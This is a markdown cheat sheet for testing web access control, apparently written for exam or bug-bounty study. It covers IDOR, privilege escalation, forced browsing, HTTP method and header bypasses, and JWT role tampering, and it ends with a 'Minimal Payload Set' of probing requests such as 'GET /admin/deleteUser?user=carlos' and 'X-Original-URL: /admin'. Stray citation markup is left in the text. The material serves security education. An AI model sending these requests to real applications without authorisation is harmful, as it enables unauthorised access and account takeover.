

---

``md
> [!ABSTRACT]
> Access Control vulnerabilities occur when an application fails to properly enforce **who can access what resources or actions**.  
> This allows attackers to **view, modify, or perform actions they shouldn’t be allowed to**.  
> 
> It happens when:
> - Authorization checks are missing or weak  
> - User roles are not properly enforced  
> - IDs or endpoints are predictable  
> 
> Impact:
> - Access other users’ data (IDOR)  
> - Perform admin actions  
> - Full account takeover  
> 
> 🧠 Think: “You’re doing something the app forgot to restrict” :contentReference[oaicite:0]{index=0}

---

## 🧠 Access Control – Cheat Sheet

---

### 🎯 1. Basic Detection (Direct Access)

> [!CHECK]
> Try accessing restricted endpoints directly  
> Look for missing authorization  

```http
GET /admin
````

```http
GET /admin/deleteUser?user=carlos
```

---

### 🧪 2. IDOR (Insecure Direct Object Reference)

> [!SUCCESS]  
> Change IDs to access other users’ data

```http
GET /api/user?id=123
```

```http
GET /api/user?id=124
```

---

### 🧬 3. Parameter Manipulation

> [!SUCCESS]  
> Modify parameters to escalate privileges

```http
POST /api/updateRole
role=admin
```

```http
GET /account?user=admin
```

---

### 🧩 4. Horizontal Privilege Escalation

> [!SUCCESS]  
> Access another user with same privilege level

```http
GET /my-account?id=wiener
```

```http
GET /my-account?id=carlos
```

---

### 💥 5. Vertical Privilege Escalation

> [!SUCCESS]  
> Access admin functionality as normal user

```http
GET /admin
```

```http
POST /admin/deleteUser
```

---

### ⚙️ 6. Forced Browsing

> [!CHECK]  
> Discover hidden endpoints

```bash
/robots.txt
```

```bash
/backup
```

```bash
/admin-panel
```

---

### 🧪 7. Method Bypass

> [!ATTENTION]  
> Change HTTP method to bypass restrictions

```http
POST /admin/deleteUser
```

```http
GET /admin/deleteUser
```

---

### 🧪 8. Header-Based Bypass

> [!ATTENTION]  
> Some apps trust headers for auth

```http
X-Forwarded-For: 127.0.0.1
```

```http
X-Original-URL: /admin
```

---

### 💣 9. JWT / Token Tampering

> [!SUCCESS]  
> Modify token to escalate privileges

```json
{
  "role": "admin"
}
```

---

### 🔍 10. Real Workflow (Operator Method)

> [!SUCCESS]

1. Browse as normal user
    
2. Try direct access:
    

```http
GET /admin
```

3. Manipulate IDs:
    

```http
GET /api/user?id=124
```

4. Modify parameters:
    

```http
role=admin
```

5. Try hidden endpoints:
    

```bash
/robots.txt
```

---

### 🧠 11. Where to Test

> [!ABSTRACT]

- API endpoints
    
- Admin panels
    
- User profiles
    
- File downloads
    
- Hidden URLs
    

---

## 🔥 Minimal Payload Set (EXAM USE)

> [!SUCCESS]  
> If you remember nothing else

```bash
GET /admin
GET /api/user?id=124
role=admin
X-Forwarded-For: 127.0.0.1
```

---

## ⚠️ Operator Notes

> [!FAILURE]  
> If nothing happens:
> 
> - Proper authorization checks exist
>     
> - IDs randomized
>     
> - Role enforced server-side
>     

---

> [!ATTENTION]  
> Access control ≠ authentication
> 
> Being logged in doesn’t mean you should have access  
> Always test:
> 
> - Different users
>     
> - Different roles
>     
> - Direct endpoint access
>     

---

```

---

## 🔥 This one is VERY important

Access Control is:
- One of the **most common real-world bugs**  
- Shows up everywhere in bug bounty  
- Easy to miss if you don’t test manually  

---


::contentReference[oaicite:1]{index=1}
```